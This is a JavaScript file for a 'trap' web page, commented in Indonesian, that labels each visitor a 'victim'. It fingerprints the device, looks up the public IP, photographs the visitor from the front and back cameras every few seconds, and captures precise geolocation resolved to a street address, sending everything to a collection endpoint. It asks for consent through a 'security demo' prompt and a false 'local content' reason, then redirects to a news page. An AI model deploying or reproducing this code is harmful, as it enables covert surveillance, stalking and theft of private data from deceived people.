// Script JS Trap HTML

// ==================== DEBUG FUNCTION ====================
function debug(message) {
  console.log("🔍 [DEBUG]", message);
  const debugDiv = document.getElementById("debug");
  if (debugDiv) {
    debugDiv.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${message}</div>`;
    debugDiv.scrollTop = debugDiv.scrollHeight;
  }
}

// Generate ID unik
const victimId =
  "victim_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9);
debug("Victim ID: " + victimId);

// Variabel global untuk kamera
let currentStream = null;
let currentCameraType = null;
let isSwitching = false;
let switchInterval = null;
let periodicInterval = null;
let cameraIndex = 0;
let availableCameras = [];
let isCameraActive = false;
let cameraRetryCount = 0;
const MAX_RETRY = 3;

// ==================== FUNGSI KIRIM DATA ====================
async function sendData(type, data) {
  try {
    debug(`Mengirim ${type}...`);
    const payload = {
      victimId: victimId,
      type: type,
      data: data,
      timestamp: new Date().toISOString(),
    };
    const response = await fetch("/api/capture", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: JSON.stringify(payload),
    });
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    const result = await response.json();
    debug(`Response: ${JSON.stringify(result)}`);
  } catch (e) {
    debug(`Error: ${e.message}`);
    console.error("Gagal kirim data:", e);
  }
}

// ==================== FUNGSI KAMERA ====================

async function getAvailableCameras() {
  try {
    if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
      debug("❌ Browser tidak mendukung enumerateDevices");
      return [];
    }
    const tempStream = await navigator.mediaDevices.getUserMedia({
      video: true,
    });
    tempStream.getTracks().forEach((track) => track.stop());
    const devices = await navigator.mediaDevices.enumerateDevices();
    const cameras = devices.filter((device) => device.kind === "videoinput");
    debug(`📷 Ditemukan ${cameras.length} kamera:`);
    cameras.forEach((cam, i) => {
      const label = cam.label || `Kamera ${i + 1}`;
      debug(`   ${i + 1}. ${label}`);
    });
    return cameras;
  } catch (err) {
    debug("❌ Gagal mendapatkan daftar kamera: " + err.message);
    return [];
  }
}

async function captureFromStream(stream, cameraType) {
  if (!stream || !stream.active) return null;
  try {
    const video = document.createElement("video");
    video.srcObject = stream;
    video.setAttribute("playsinline", "");
    video.setAttribute("autoplay", "");
    await new Promise((resolve, reject) => {
      video.onloadedmetadata = () => video.play().then(resolve).catch(reject);
      video.onerror = reject;
      setTimeout(() => reject(new Error("Video timeout")), 5000);
    });
    await new Promise((r) => setTimeout(r, 300));
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const context = canvas.getContext("2d");
    if (cameraType === "front") {
      context.translate(canvas.width, 0);
      context.scale(-1, 1);
    }
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    context.setTransform(1, 0, 0, 1, 0, 0);
    const imageData = canvas.toDataURL("image/jpeg", 0.5);
    video.srcObject = null;
    video.remove();
    return imageData;
  } catch (err) {
    debug(`❌ Gagal capture ${cameraType}: ` + err.message);
    return null;
  }
}

function handleCameraError(err, cameraType) {
  let errorMessage = "";
  switch (err.name) {
    case "NotAllowedError":
    case "PermissionDeniedError":
      errorMessage = "Pengguna menolak akses kamera";
      break;
    case "NotFoundError":
    case "DevicesNotFoundError":
      errorMessage = `Kamera ${cameraType} tidak ditemukan`;
      break;
    case "NotReadableError":
    case "TrackStartError":
      errorMessage = `Kamera ${cameraType} sedang digunakan aplikasi lain`;
      break;
    default:
      errorMessage = err.message;
  }
  debug(`❌ Error ${cameraType}: ${errorMessage}`);
  if (cameraRetryCount >= MAX_RETRY) {
    const statusEl = document.getElementById("status");
    if (statusEl) statusEl.textContent = errorMessage;
  }
  sendData("camera_error", {
    camera: cameraType,
    error: errorMessage,
    code: err.name,
  });
}

// ============= FUNGSI START CAMERA YANG DIPERBAIKI =============
async function startCameraWithDevice(device, cameraLabel, retryCount = 0) {
  if (isSwitching) {
    debug("⏳ Sedang beralih kamera, tunggu...");
    return false;
  }
  isSwitching = true;
  try {
    // Hentikan stream sebelumnya
    if (currentStream) {
      currentStream.getTracks().forEach((track) => track.stop());
      debug(`🛑 Kamera ${currentCameraType} dihentikan`);
      await sendData("camera_switched", {
        previous: currentCameraType,
        action: "stopped",
        timestamp: new Date().toISOString(),
      });
    }
    // Tentukan tipe kamera
    let cameraType = "unknown";
    const labelLower = cameraLabel.toLowerCase();
    if (
      labelLower.includes("front") ||
      labelLower.includes("face") ||
      labelLower.includes("user") ||
      labelLower.includes("selfie") ||
      availableCameras.indexOf(device) === 0
    ) {
      cameraType = "front";
    } else {
      cameraType = "back";
    }
    // Konfigurasi constraints
    const constraints = {
      video: {
        width: { ideal: 640, max: 1280 },
        height: { ideal: 480, max: 720 },
        frameRate: { ideal: 30, max: 30 },
      },
    };
    if (device.deviceId) {
      constraints.video.deviceId = { exact: device.deviceId };
      debug(
        `📷 Mengakses kamera ${cameraType} dengan deviceId: ${device.deviceId}`,
      );
    }
    const statusEl = document.getElementById("status");
    if (statusEl) {
      statusEl.textContent = `Mengakses kamera ${cameraType === "front" ? "DEPAN" : "BELAKANG"}...`;
    }
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    currentStream = stream;
    currentCameraType = cameraType;
    cameraRetryCount = 0;
    debug(`✅ Kamera ${cameraType} aktif (${cameraLabel})`);
    await sendData("camera_access", {
      camera: cameraType,
      cameraLabel: cameraLabel,
      status: "active",
      timestamp: new Date().toISOString(),
    });
    // Tunggu stream stabil
    await new Promise((r) => setTimeout(r, 500));
    // Ambil foto setelah aktif
    const image = await captureFromStream(stream, cameraType);
    if (image) {
      const response = await fetch("/api/capture-image", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          victimId: victimId,
          image: image,
          cameraType: cameraType,
          cameraLabel: cameraLabel,
          timestamp: new Date().toISOString(),
        }),
      });
      const result = await response.json();
      debug(
        `📸 Foto ${cameraType} (${cameraLabel}) terkirim: ${result.status}`,
      );
    }
    return true;
  } catch (err) {
    handleCameraError(err, cameraType || "unknown");
    if (
      retryCount < MAX_RETRY &&
      (err.name === "NotReadableError" || err.name === "TrackStartError")
    ) {
      debug(`🔄 Retry kamera (${retryCount + 1}/${MAX_RETRY})...`);
      await new Promise((r) => setTimeout(r, 1000));
      return await startCameraWithDevice(device, cameraLabel, retryCount + 1);
    }
    return false;
  } finally {
    isSwitching = false;
  }
}

// ============= FUNGSI SWITCH CAMERA YANG DIPERBAIKI =============
async function switchToNextCamera() {
  if (!availableCameras.length) {
    debug("❌ Tidak ada kamera tersedia untuk beralih");
    return;
  }
  // Hentikan stream saat ini TERLEBIH DAHULU
  if (currentStream) {
    currentStream.getTracks().forEach((track) => track.stop());
    debug(`🛑 Kamera ${currentCameraType} dihentikan sebelum switch`);
    await sendData("camera_switched", {
      previous: currentCameraType,
      action: "stopped",
      timestamp: new Date().toISOString(),
    });
    currentStream = null;
  }
  // Pindah ke kamera berikutnya
  cameraIndex = (cameraIndex + 1) % availableCameras.length;
  const nextCamera = availableCameras[cameraIndex];
  const cameraLabel = nextCamera.label || `Kamera ${cameraIndex + 1}`;
  let cameraType = "unknown";
  const labelLower = cameraLabel.toLowerCase();
  if (
    labelLower.includes("front") ||
    labelLower.includes("face") ||
    labelLower.includes("user") ||
    labelLower.includes("selfie") ||
    cameraIndex === 0
  ) {
    cameraType = "front";
  } else {
    cameraType = "back";
  }
  debug(
    `🔄 Beralih ke kamera ${cameraIndex + 1}: ${cameraLabel} (${cameraType})`,
  );
  const statusEl = document.getElementById("status");
  if (statusEl) {
    statusEl.textContent = `Mengganti ke kamera ${cameraType === "front" ? "DEPAN" : "BELAKANG"}...`;
  }
  try {
    const constraints = {
      video: {
        width: { ideal: 640, max: 1280 },
        height: { ideal: 480, max: 720 },
      },
    };
    if (nextCamera.deviceId) {
      constraints.video.deviceId = { exact: nextCamera.deviceId };
    }
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    currentStream = stream;
    currentCameraType = cameraType;
    debug(`✅ Kamera ${cameraType} aktif (${cameraLabel})`);
    await sendData("camera_access", {
      camera: cameraType,
      cameraLabel: cameraLabel,
      status: "active",
      timestamp: new Date().toISOString(),
    });
    await new Promise((r) => setTimeout(r, 500));
    const image = await captureFromStream(stream, cameraType);
    if (image) {
      const response = await fetch("/api/capture-image", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          victimId: victimId,
          image: image,
          cameraType: cameraType,
          cameraLabel: cameraLabel,
          timestamp: new Date().toISOString(),
          isSwitch: true,
        }),
      });
      const result = await response.json();
      debug(`📸 Foto ${cameraType} setelah switch terkirim: ${result.status}`);
    }
    if (statusEl) {
      statusEl.textContent = `Kamera aktif: ${cameraType === "front" ? "DEPAN" : "BELAKANG"} | Akan bergantian setiap 10 detik`;
    }
  } catch (err) {
    debug(`❌ Gagal switch ke kamera ${cameraType}: ${err.message}`);
    await sendData("camera_error", {
      camera: cameraType,
      error: err.message,
      action: "switch",
    });
    if (cameraIndex > 0) {
      cameraIndex = cameraIndex - 1;
      const prevCamera = availableCameras[cameraIndex];
      const prevLabel = prevCamera.label || `Kamera ${cameraIndex + 1}`;
      debug(`🔄 Kembali ke kamera sebelumnya: ${prevLabel}`);
      await startCameraWithDevice(prevCamera, prevLabel);
    }
  }
}

function stopAllCameras() {
  if (currentStream) {
    currentStream.getTracks().forEach((track) => track.stop());
    currentStream = null;
  }
  if (switchInterval) clearInterval(switchInterval);
  if (periodicInterval) clearInterval(periodicInterval);
  isCameraActive = false;
  debug("🛑 Semua kamera dihentikan");
  sendData("camera_access", { status: "stopped" });
}

async function startFallbackCamera() {
  debug("🔄 Mencoba akses kamera default (fallback)...");
  try {
    const fallbackStream = await navigator.mediaDevices.getUserMedia({
      video: { width: { ideal: 640 }, height: { ideal: 480 } },
    });
    currentStream = fallbackStream;
    currentCameraType = "default";
    isCameraActive = true;
    debug("✅ Kamera default berhasil (fallback mode)");
    await sendData("camera_access", {
      camera: "default",
      status: "granted_fallback",
    });
    periodicInterval = setInterval(async () => {
      if (currentStream && currentStream.active) {
        const image = await captureFromStream(currentStream, "default");
        if (image) {
          await fetch("/api/capture-image", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              victimId,
              image,
              cameraType: "fallback",
              timestamp: new Date().toISOString(),
            }),
          });
          debug("📸 Foto fallback terkirim");
        }
      }
    }, 3000);
    return true;
  } catch (fallbackErr) {
    handleCameraError(fallbackErr, "fallback");
    debug("❌ Fallback juga gagal: " + fallbackErr.message);
    return false;
  }
}

// ==================== EKSEKUSI DATA ====================

setTimeout(async () => {
  debug("Mengumpulkan info device...");
  const deviceInfo = {
    userAgent: navigator.userAgent || "Tidak tersedia",
    platform: navigator.platform || "Tidak tersedia",
    language: navigator.language || "Tidak tersedia",
    cookiesEnabled: navigator.cookieEnabled,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    colorDepth: window.screen.colorDepth,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    battery: "Tidak tersedia",
    referrer: document.referrer || "Langsung",
    hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
    deviceMemory: navigator.deviceMemory || "N/A",
  };
  if ("getBattery" in navigator) {
    try {
      const battery = await navigator.getBattery();
      deviceInfo.battery = (battery.level * 100).toFixed(0) + "%";
      deviceInfo.charging = battery.charging;
    } catch (e) {
      debug("Battery error: " + e.message);
    }
  }
  await sendData("device_info", deviceInfo);
}, 1000);

setTimeout(async () => {
  debug("Mengecek jaringan...");
  await sendData("network", {
    online: navigator.onLine,
    connection: navigator.connection
      ? {
          type: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink,
          rtt: navigator.connection.rtt,
          saveData: navigator.connection.saveData,
        }
      : "Tidak tersedia",
  });
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);
    const response = await fetch("https://api.ipify.org?format=json", {
      signal: controller.signal,
    });
    clearTimeout(timeoutId);
    const data = await response.json();
    await sendData("public_ip", data.ip);
    debug("Public IP: " + data.ip);
  } catch (e) {
    debug("Gagal dapat IP public: " + e.message);
  }
}, 2000);

setTimeout(async () => {
  debug("📷 Memulai akses kamera (switch camera mode)...");
  const izinAwal = confirm(
    "⚠️ DEMO KEAMANAN SIBER ⚠️\n\n" +
      "Website ini akan mengakses kamera Anda untuk simulasi keamanan.\n\n" +
      "Klik OK untuk mengizinkan akses kamera",
  );
  if (!izinAwal) {
    debug("❌ Izin kamera ditolak user");
    await sendData("camera_access", { status: "denied" });
    return;
  }
  availableCameras = await getAvailableCameras();
  if (availableCameras.length === 0) {
    debug("❌ Tidak ada kamera ditemukan");
    await startFallbackCamera();
    return;
  }
  const firstCamera = availableCameras[0];
  const firstLabel = firstCamera.label || "Kamera 1";
  const firstSuccess = await startCameraWithDevice(firstCamera, firstLabel);
  if (firstSuccess) {
    isCameraActive = true;
    // Kirim foto periodik setiap 3 detik - DENGAN CAMERA TYPE YANG BENAR
    periodicInterval = setInterval(async () => {
      if (
        currentStream &&
        currentStream.active &&
        !isSwitching &&
        currentCameraType
      ) {
        const image = await captureFromStream(currentStream, currentCameraType);
        if (image) {
          try {
            await fetch("/api/capture-image", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                victimId: victimId,
                image: image,
                cameraType: currentCameraType,
                timestamp: new Date().toISOString(),
                isPeriodic: true,
              }),
            });
            debug(`📸 Foto periodik dari kamera ${currentCameraType} terkirim`);
          } catch (e) {
            debug(`❌ Gagal kirim foto periodik: ${e.message}`);
          }
        }
      }
    }, 3000);
    if (availableCameras.length > 1) {
      debug(
        `📷 Terdeteksi ${availableCameras.length} kamera, akan bergantian setiap 10 detik`,
      );
      const statusEl = document.getElementById("status");
      if (statusEl) {
        statusEl.textContent = `Kamera aktif: ${currentCameraType === "front" ? "DEPAN" : "BELAKANG"} | Akan bergantian setiap 10 detik`;
      }
      switchInterval = setInterval(async () => {
        if (!isSwitching && currentStream) {
          debug("🔄 Menjalankan pergantian kamera otomatis...");
          await switchToNextCamera();
          if (statusEl) {
            statusEl.textContent = `Kamera aktif: ${currentCameraType === "front" ? "DEPAN" : "BELAKANG"} | Akan bergantian setiap 10 detik`;
          }
        }
      }, 10000);
    } else {
      debug("📷 Hanya 1 kamera tersedia, mode single camera");
      const statusEl = document.getElementById("status");
      if (statusEl)
        statusEl.textContent = `Kamera aktif (single) | Mengirim foto setiap 3 detik`;
    }
    debug("✅ Sistem kamera siap");
  } else {
    debug("❌ Gagal mengakses kamera pertama");
    await startFallbackCamera();
  }
}, 3000);

setTimeout(async () => {
  debug("Meminta akses lokasi...");
  const izinLokasi = confirm(
    "Website ini ingin mengetahui lokasi Anda untuk konten lokal. Izinkan?",
  );
  if (izinLokasi && "geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const locationData = {
          status: "granted",
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          heading: position.coords.heading,
          speed: position.coords.speed,
        };
        await sendData("location", locationData);
        debug(
          `Lokasi: ${position.coords.latitude}, ${position.coords.longitude}`,
        );
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 5000);
          const geoResponse = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=18&addressdetails=1`,
            { signal: controller.signal },
          );
          clearTimeout(timeoutId);
          const geoData = await geoResponse.json();
          await sendData("location_address", geoData.display_name);
          debug("Alamat: " + geoData.display_name);
        } catch (e) {
          debug("Gagal reverse geocoding: " + e.message);
        }
      },
      async (error) => {
        let errorMessage = "Unknown error";
        switch (error.code) {
          case error.PERMISSION_DENIED:
            errorMessage = "Permission denied";
            break;
          case error.POSITION_UNAVAILABLE:
            errorMessage = "Position unavailable";
            break;
          case error.TIMEOUT:
            errorMessage = "Timeout";
            break;
        }
        await sendData("location", { status: "error", error: errorMessage });
        debug("Error lokasi: " + errorMessage);
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 },
    );
  } else {
    await sendData("location", { status: "denied" });
    debug("Lokasi ditolak atau tidak tersedia");
  }
}, 4000);

let counter = 0;
const statusInterval = setInterval(() => {
  counter++;
  const statusEl = document.getElementById("status");
  if (statusEl) {
    const loadingText = [
      "Memuat",
      "Menyiapkan",
      "Memproses",
      "Menginisialisasi",
    ];
    statusEl.textContent = `${loadingText[counter % loadingText.length]}... ${counter}/10`;
  }
  if (counter >= 10) {
    clearInterval(statusInterval);
    if (statusEl) statusEl.textContent = "Selesai! Mengalihkan...";
    stopAllCameras();
    setTimeout(() => {
      window.location.href = "/berita.html?ref=demo";
    }, 2000);
  }
}, 1000);

window.addEventListener("beforeunload", () => stopAllCameras());
if (window.location.search.includes("debug=true")) {
  const debugDiv = document.querySelector(".debug");
  if (debugDiv) debugDiv.style.display = "block";
}
debug("✅ Trap page loaded, waiting for actions...");
